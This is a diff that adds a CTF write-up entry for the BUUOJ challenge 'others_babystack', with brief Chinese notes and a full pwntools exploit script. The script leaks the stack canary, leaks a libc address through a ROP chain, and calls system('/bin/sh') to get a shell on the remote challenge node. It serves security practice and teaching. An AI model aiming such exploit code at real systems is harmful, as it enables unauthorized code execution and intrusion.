@@ -1203,3 +1203,81 @@ if __name__ == "__main__":
     main()
 
 ```
+
+### others_babystack
+
+[题目链接](https://buuoj.cn/challenges#others_babystack)
+
+首先泄露 canary，canary 前两位是 \x00 截断了输出，我们用 A 覆盖它。
+
+<img width="2106" height="1306" alt="e18249248ac6e91dd1429cfafe26720f" src="https://github.com/user-attachments/assets/7d45e59d-1646-4535-ae4b-3f1675dde5d7" />
+
+把 canary 填上之后就是轻松的 ROP 链了。
+
+注意 ROP 链需要 ret 来引爆，刚好 opt=3 是 return 0.
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 28356
+io = remote(host,port)
+# io = process("./babystack")
+elf = ELF("./babystack")
+libc = ELF("./libc-2.23.so")
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = 0x400908
+pop_rdi_ret = 0x400a93
+ret = 0x400a94
+
+def main():
+    io.recvuntil(b">> ")
+    # print("\n[+] Leak puts GOT address :",hex(puts_got))
+    io.sendline(b"1")
+    sleep(0.1)
+    payload = b'A'*0x84 + b"meow" + b'A'
+    io.send(payload)
+    io.recvuntil(b">> ")
+    io.sendline(b"2")
+    io.recvuntil(b"meowA")
+    leak_data = io.recvn(7)
+    leak_data = leak_data.rjust(8,b"\x00")
+    canary = u64(leak_data)
+    print("\n[+] Leak canary :",hex(canary))
+    io.recvuntil(b">> ")
+    io.sendline(b"1")
+    sleep(0.1)
+    payload_1 = b'B'*0X88 + p64(canary) + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+    # gdb.attach(io,"b *0x4009DD\nc")
+    # pause()
+    io.send(payload_1)
+    io.recvuntil(b">> ")
+    io.sendline(b"3")
+    leak_data = io.recvline().strip(b'\n').ljust(8,b'\x00')
+    # print("\n[*] DEBUG: leak data = ",leak_data)
+    puts_addr = u64(leak_data)
+    print("\n[+] Leak puts address :",hex(puts_addr))
+    libc_base = puts_addr - libc.sym['puts']
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak system address :",hex(system))
+    binsh = libc_base + next(libc.search("/bin/sh"))
+    print("\n[+] Leak /bin/sh address :",hex(binsh))
+    io.sendline(b"1")
+    sleep(0.1)
+    payload_2 = b'C'*0x88 + p64(canary) + b"C"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
+    io.send(payload_2)
+    io.recvuntil(b">> ")
+    io.sendline(b"3")
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+
+```
+
+
